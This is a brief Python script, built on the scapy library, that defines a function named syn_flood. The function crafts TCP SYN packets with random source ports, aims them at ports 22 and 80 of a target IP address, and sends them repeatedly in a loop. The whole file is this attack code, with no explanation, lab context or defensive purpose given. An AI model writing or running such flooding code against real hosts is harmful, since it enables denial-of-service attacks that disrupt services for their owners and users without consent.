#! /usr/bin/env python

import sys
from scapy.all import *

def syn_flood(ip_addr, num_packs):
	p=IP(dst=ip_addr,id=9999,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")
	srloop(p,count=num_packs, inter=0.3,retry=2,timeout=4)
	return 1

